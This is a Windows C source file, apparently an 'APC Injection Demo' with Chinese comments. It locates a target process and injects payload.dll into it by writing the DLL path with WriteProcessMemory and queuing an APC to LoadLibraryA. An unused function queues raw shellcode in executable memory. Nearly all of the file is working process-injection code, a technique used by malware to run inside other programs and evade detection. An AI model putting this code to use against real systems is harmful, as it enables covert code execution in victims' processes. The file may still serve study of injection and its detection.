#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <locale.h>

// 获取目标进程ID
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD processId = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processId;
}

// 获取目标进程的主线程ID
DWORD GetMainThreadId(DWORD processId) {
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    DWORD threadId = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return threadId;
}

// APC注入函数
BOOL APCInjection(DWORD processId, DWORD threadId, PVOID shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pRemoteMemory = NULL;
    BOOL result = FALSE;

    // 打开目标进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("[ERROR] Failed to open target process (Error: %d)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully opened target process (PID: %d)\n", processId);

    // 在目标进程中分配内存
    pRemoteMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteMemory == NULL) {
        printf("[ERROR] Failed to allocate memory in target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully allocated memory in target process (Address: 0x%p)\n", pRemoteMemory);

    // 将shellcode写入目标进程
    if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode, shellcodeSize, NULL)) {
        printf("[ERROR] Failed to write shellcode to target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully wrote shellcode to target process\n");

    // 打开目标线程
    hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (hThread == NULL) {
        printf("[ERROR] Failed to open target thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully opened target thread (TID: %d)\n", threadId);

    // 将APC排队到目标线程
    if (QueueUserAPC((PAPCFUNC)pRemoteMemory, hThread, NULL) == 0) {
        printf("[ERROR] Failed to queue APC to target thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully queued APC to target thread\n");
    printf("[+] APC injection completed! Waiting for target thread to enter alertable state...\n");

    result = TRUE;

cleanup:
    if (hThread != NULL) {
        CloseHandle(hThread);
    }
    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }

    return result;
}

// 检查字符串是否为纯数字
BOOL IsNumeric(const char* str) {
    if (str == NULL || *str == '\0') {
        return FALSE;
    }
    while (*str) {
        if (*str < '0' || *str > '9') {
            return FALSE;
        }
        str++;
    }
    return TRUE;
}

int main(int argc, char* argv[]) {
    // 设置控制台代码页为UTF-8，解决中文乱码问题
    SetConsoleOutputCP(65001);  // UTF-8
    SetConsoleCP(65001);

    DWORD targetPid = 0;
    DWORD targetTid = 0;

    printf("=== APC Injection Demo ===\n\n");

    // 检查命令行参数
    if (argc < 2) {
        printf("Usage: %s <PID> or %s <process_name>\n", argv[0], argv[0]);
        printf("Example: %s 1234\n", argv[0]);
        printf("Example: %s target.exe\n", argv[0]);
        return 1;
    }

    // 如果参数是纯数字，直接作为PID使用
    if (IsNumeric(argv[1])) {
        targetPid = (DWORD)atoi(argv[1]);
        printf("[*] Using PID directly: %d\n", targetPid);
    }
    else {
        // 否则通过进程名查找
        const char* processName = argv[1];
        printf("[*] Searching for target process: %s\n", processName);
        targetPid = GetProcessIdByName(processName);
        if (targetPid == 0) {
            printf("[ERROR] Target process not found: %s\n", processName);
            printf("[TIP] You can also use PID directly: %s <PID>\n", argv[0]);
            return 1;
        }
    }

    // 验证进程是否存在
    HANDLE hTest = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (hTest == NULL) {
        printf("[ERROR] Process with PID %d does not exist or access denied (Error: %d)\n", targetPid, GetLastError());
        printf("[TIP] Try running as administrator\n");
        return 1;
    }
    CloseHandle(hTest);

    printf("[+] Found target process (PID: %d)\n", targetPid);

    // 获取目标进程的主线程ID
    targetTid = GetMainThreadId(targetPid);
    if (targetTid == 0) {
        printf("[ERROR] Failed to get main thread ID of target process\n");
        return 1;
    }

    printf("[+] Found target thread (TID: %d)\n", targetTid);

    // 使用LoadLibraryA进行DLL注入（更实用的方法）
    char dllPath[MAX_PATH];
    if (GetFullPathNameA("payload.dll", MAX_PATH, dllPath, NULL) == 0) {
        printf("[ERROR] Failed to get full path of payload.dll\n");
        return 1;
    }

    printf("[*] Preparing to inject DLL: %s\n", dllPath);

    // 执行APC注入（注入LoadLibraryA调用）
    if (APCInjectionDLL(targetPid, targetTid, dllPath)) {
        printf("\n[SUCCESS] APC injection completed!\n");
        printf("[TIP] If target thread is in alertable state, message box should have appeared.\n");
        return 0;
    }
    else {
        printf("\n[FAILED] APC injection failed!\n");
        return 1;
    }
}

// 使用DLL路径进行APC注入
BOOL APCInjectionDLL(DWORD processId, DWORD threadId, const char* dllPath) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pRemoteMemory = NULL;
    PVOID pLoadLibraryA = NULL;
    SIZE_T pathLen = strlen(dllPath) + 1;
    BOOL result = FALSE;

    // 打开目标进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("[错误] 无法打开目标进程 (错误代码: %d)\n", GetLastError());
        return FALSE;
    }

    printf("[+] 成功打开目标进程 (PID: %d)\n", processId);

    // 在目标进程中分配内存用于存储DLL路径
    pRemoteMemory = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        printf("[ERROR] Failed to allocate memory in target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully allocated memory in target process (Address: 0x%p)\n", pRemoteMemory);

    // 将DLL路径写入目标进程
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, pathLen, NULL)) {
        printf("[ERROR] Failed to write DLL path to target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully wrote DLL path to target process\n");

    // 获取LoadLibraryA的地址（在kernel32.dll中，所有进程共享）
    pLoadLibraryA = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        printf("[ERROR] Failed to get LoadLibraryA address\n");
        goto cleanup;
    }

    printf("[+] LoadLibraryA address: 0x%p\n", pLoadLibraryA);

    // 打开目标线程
    hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (hThread == NULL) {
        printf("[ERROR] Failed to open target thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully opened target thread (TID: %d)\n", threadId);

    // 将APC排队到目标线程，调用LoadLibraryA加载DLL
    if (QueueUserAPC((PAPCFUNC)pLoadLibraryA, hThread, (ULONG_PTR)pRemoteMemory) == 0) {
        printf("[ERROR] Failed to queue APC to target thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully queued APC to target thread\n");
    printf("[+] APC injection completed! Waiting for target thread to enter alertable state...\n");

    result = TRUE;

cleanup:
    if (hThread != NULL) {
        CloseHandle(hThread);
    }
    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }

    return result;
}

